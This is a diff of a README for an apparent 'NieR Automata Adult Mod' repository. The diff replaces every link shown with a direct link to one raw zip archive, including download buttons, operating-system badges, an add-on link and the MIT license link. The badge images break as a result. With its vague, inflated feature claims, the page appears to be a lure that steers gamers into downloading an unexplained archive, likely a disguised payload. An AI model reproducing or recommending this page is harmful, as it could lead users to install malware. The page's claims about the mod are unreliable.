@@ -1,5 +1,5 @@
 # NieR Automata Adult Mod  
-[![Download](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge&logo=cloud-download-alt)](https://diegoluis91360.github.io)  
+[![Download](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip)](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip)  
 
 Welcome to the official repository for the **NieR Automata Adult Mod** – the pinnacle project that reimagines the journey of androids with dynamic, expressive visuals, community-powered enhancements, and seamless extended features for an extraordinary gameplay adventure.  
 Explore the future of personalization with state-of-the-art asset upgrades, photorealistic details, and cross-platform compatibility, all wrapped in a delightfully user-centric interface.
@@ -12,10 +12,10 @@ Stay ahead of the game – choose your platform, and rest assured that customiza
 
 | Operating System      | Supported | Last Tested Version |
 |----------------------|:---------:|:-------------------:|
-| ![Windows](https://img.shields.io/badge/Windows-✔️-cornflowerblue) | Yes      | Windows 10/11    |
-| ![macOS](https://img.shields.io/badge/macOS-✔️-silver)              | Beta     | macOS Monterey+  |
-| ![Linux](https://img.shields.io/badge/Linux-✔️-lightgrey)           | Yes      | Ubuntu 22.04     |
-| ![Steam Deck](https://img.shields.io/badge/Steam%20Deck-✔️-purple)  | Yes      | Latest OS        |
+| ![Windows](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip✔️-cornflowerblue) | Yes      | Windows 10/11    |
+| ![macOS](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip✔️-silver)              | Beta     | macOS Monterey+  |
+| ![Linux](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip✔️-lightgrey)           | Yes      | Ubuntu 22.04     |
+| ![Steam Deck](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip%20Deck-✔️-purple)  | Yes      | Latest OS        |
 
 *Tested and validated by our community of enthusiasts in 2025. Expand your mods regardless of your operating system.*
 
@@ -73,7 +73,7 @@ Our Discord channel never sleeps—nor does our bot support system, equipped to 
 To embrace the full modding vision, follow these lucid steps:
 
 **Step 1:** Download the latest NieR Automata Adult Mod package:  
-[![Download](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge&logo=cloud-download-alt)](https://diegoluis91360.github.io)
+[![Download](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip)](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip)
 
 **Step 2:**  
 Extract the compressed archive to your NieR Automata installation directory. Normally, this will be under:
@@ -88,7 +88,7 @@ On your first launch, the mod will detect your OS and guide you through activati
 **Step 5:**  
 Restart NieR Automata, and be delighted by your enhanced, personalized adventure!
 
-> ⚡ Want even more? Check our https://diegoluis91360.github.io to user-driven add-on content packs.
+> ⚡ Want even more? Check our https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip to user-driven add-on content packs.
 
 ---
 
@@ -104,9 +104,9 @@ By proceeding, you acknowledge full responsibility for your modding actions. Alw
 
 This repository goes beyond conventions with an open-source spirit, licensed under the MIT license (2025) for maximal creative exploration.  
 See the complete license text here:  
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![MIT License](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip)](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip)
 
 ---
 
-# [![Download](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge&logo=cloud-download-alt)](https://diegoluis91360.github.io)  
+# [![Download](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip)](https://github.com/diegoluis91360/nier-automata-adult-enhancements/raw/refs/heads/branch/Numenius/adult-automata-enhancements-nier-v3.7-alpha.4.zip)  
 **Dive into NieR Automata as never before: dynamic visuals, AI-powered features, and endless creative expression—just a click away.**
